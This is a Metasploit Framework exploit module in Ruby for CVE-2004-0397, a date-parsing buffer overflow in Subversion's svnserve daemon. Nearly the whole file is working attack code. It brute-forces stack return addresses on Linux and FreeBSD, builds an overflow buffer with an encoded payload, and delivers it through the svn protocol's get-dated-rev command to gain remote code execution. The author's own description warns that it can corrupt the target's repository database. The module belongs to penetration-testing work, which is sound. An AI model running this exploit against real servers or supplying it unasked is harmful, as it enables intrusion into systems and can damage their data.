##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/exploit/http'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Brute
	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Subversion Date Svnserve',
			'Description'    => %q{
      This is an exploit for the Subversion date parsing overflow.  This
      exploit is for the svnserve daemon (svn:// protocol) and will not work
      for Subversion over webdav (http[s]://).  This exploit should never
      crash the daemon, and should be safe to do multi-hits.

      **WARNING** This exploit seems to (not very often, I've only seen
      it during testing) corrupt the subversion database, so be careful!
			},
			'Author'         => 'spoonm',
			'Version'        => '$Revision$',
			'References'     =>
				[
				    	['CVE', '2004-0397'],
					['OSVDB', '6301'],
					['BID',	'10386'],
					['URL',   'http://lists.netsys.com/pipermail/full-disclosure/2004-May/021737.html'],
					['MIL',   '68'],
				],
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x09\x0a\x0b\x0c\x0d\x20",
					'MinNops'  => 16,
				},	
			'SaveRegisters'  => [ 'esp' ],
			'Arch'           => 'x86',
			'Platform'       => [ 'linux', 'bsd' ],
			'Targets'        => 
				[
					[ 
						'Linux Bruteforce',
						{
							'Platform'   => 'linux',
							'Bruteforce' => 
								{
									'Start' => { 'Ret' => 0xbffffe13 },
									'Stop'  => { 'Ret' => 0xbfff0000 },
									'Step'  => 0
								}
						},
					],
					[ 
						'FreeBSD Bruteforce',
						{
							'Platform'   => 'bsd',
							'Bruteforce' => 
								{
									'Start' => { 'Ret' => 0xbfbffe13 },
									'Stop'  => { 'Ret' => 0xbfbf0000 },
									'Step'  => 0
								}
						},
					],

				],
			'DisclosureDate' => 'May 19 2004'))

		register_options(
			[
				Opt::RPORT(3690),	
				OptString.new('URL', [ true, "SVN URL (ie svn://host/repos)", "svn://host/svn/repos" ])
			], self.class)
	
		register_advanced_options(
			[
				# 62 on spoonm's, 88 on HD's
				OptInt.new('RetLength', [ false, "Length of rets after payload", 100 ]),
				OptBool.new('IgnoreErrors', [ false, "Ignore errors", false ])
			], self.class)
	end

	def check
	end

	def brute_exploit(addresses)
		connect
		
		print_status("Trying #{"%.8x" % addresses['Ret']}...")

		buffer = ([addresses['Ret']].pack('V') * (datastore['RetLength'] / 4).to_i) + payload.encoded
		
		[
			"( 2 ( edit-pipeline ) " + lengther(datastore['URL']) + " ) ",
			"( ANONYMOUS ( 0; ) )",
			"( get-dated-rev ( " + lengther(buffer + " 3 Oct 2000 01:01:01.001 (day 277, dst 1, gmt_off)") + " ) ) "
		].each_with_index { |buf, index|
			trash = sock.get_once

			print_line("Received: #{trash}") if debugging?
			
			if (sock.put(buf) || 0) == 0 and index < 3
				print_error("Error transmitting buffer.")
				raise ExploitError, "Failed to transmit data" if !datastore['IgnoreErrors']
			end

			if index == 3 and trash.length > 0
				print_error("Received data when we shouldn't have")
				raise ExploitError, "Received data when it wasn't expected" if !datastore['IgnoreErrors']
			end
		}

		handler
		disconnect
	end

	def lengther(buf)
		"#{buf.length}:" + buf
	end

end